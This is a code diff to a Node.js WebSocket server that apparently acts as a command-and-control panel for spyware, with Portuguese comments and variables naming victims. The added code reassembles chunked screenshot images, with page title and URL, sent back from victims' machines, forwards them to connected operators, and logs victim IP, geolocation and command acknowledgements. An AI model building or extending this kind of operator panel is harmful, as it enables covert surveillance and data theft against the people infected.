@@ -8,6 +8,7 @@ const wss = new WebSocket.Server({ server });
 const sessions = {};
 const victimConnections = {};
 const adminClients = new Set();
+const imageChunks = {}; // sess -> { cmd: { total, chunks, title, url } }
 
 app.get('/', (req, res) => {
   res.send(`<!DOCTYPE html>
@@ -244,6 +245,9 @@ function renderLogs(id) {
         } else if (log.cmd === 'ack') {
           content = \`✅ Comando "\${log.command}" recebido pela vítima\`;
           cls = 'highlight-handshake';
+        } else if (log.cmd === 'message_received') {
+          content = \`📨 Mensagem "\${log.original}" recebida pela vítima\`;
+          cls = 'highlight-cmd';
         } else {
           content = JSON.stringify(log, null, 2);
         }
@@ -324,6 +328,43 @@ wss.on('connection', async (ws) => {
         }
         return;
       }
+      // Trata chunks de imagem
+      if (data.type === 'image_chunk' && data.sess) {
+        const key = data.cmd;
+        if (!imageChunks[data.sess]) imageChunks[data.sess] = {};
+        if (!imageChunks[data.sess][key]) {
+          imageChunks[data.sess][key] = { total: data.total, chunks: [], title: data.title, url: data.url };
+        }
+        imageChunks[data.sess][key].chunks[data.index] = data.data;
+        // Verifica se todos os chunks chegaram
+        const chunkData = imageChunks[data.sess][key];
+        if (chunkData.chunks.filter(c => c !== undefined).length === data.total) {
+          const fullBase64 = chunkData.chunks.join('');
+          const imageData = 'data:image/jpeg;base64,' + fullBase64;
+          const result = {
+            type: 'cmd_result',
+            cmd: data.cmd,
+            image: imageData,
+            title: chunkData.title,
+            url: chunkData.url,
+            sess: data.sess,
+            _t: Date.now()
+          };
+          // Envia para todos os admins
+          adminClients.forEach(client => {
+            if (client.readyState === WebSocket.OPEN) {
+              client.send(JSON.stringify({ type: 'update', ...result }));
+            }
+          });
+          // Salva nos logs da sessão
+          if (!sessions[data.sess]) sessions[data.sess] = [];
+          sessions[data.sess].push(result);
+          // Limpa chunks
+          delete imageChunks[data.sess][key];
+        }
+        return;
+      }
+      // Dados normais da vítima
       if (data.sess) {
         if (!victimConnections[data.sess] || victimConnections[data.sess].readyState !== WebSocket.OPEN) {
           victimConnections[data.sess] = ws;
@@ -333,7 +374,6 @@ wss.on('connection', async (ws) => {
         }
         if (!sessions[data.sess]) sessions[data.sess] = [];
         if (data.type === 'handshake') { data.ip = ip; data.geo = geo; }
-        // Log para depuração
         console.log(`[${data.sess}] Tipo: ${data.type}, Cmd: ${data.cmd || 'N/A'}`);
         sessions[data.sess].push(data);
         adminClients.forEach(client => {
